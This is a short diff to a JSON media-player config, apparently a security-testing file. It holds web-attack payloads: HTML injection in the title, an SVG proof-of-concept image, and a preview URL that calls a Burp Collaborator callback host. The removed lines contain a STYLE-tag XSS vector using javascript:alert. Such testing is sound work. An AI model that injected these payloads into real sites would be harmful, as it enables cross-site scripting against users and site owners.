@@ -1,16 +1,12 @@
 {
   "audio": "",
+  "id": "1",
   "title": "<h1>Hello</h1>",
   "image": "https://brutelogic.com.br/poc.svg", 
-  "type": "image/svg+xml",
-  "AllowScriptAccess": "always",
   "isStereo": true,
   "isYawOnly": false,
-  "preview": "",
+  "preview": "https://o7wsxn7orn9x4psn4vpjdy9p3g96xv.burpcollaborator.net",
   "video": "",
   "pitch": 0,
   "yaw": 1.6,
-  "description" : "STYLE tag using background-image.",
-  "name" : "STYLE w/background-image",
-  "vector" : "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"
 }
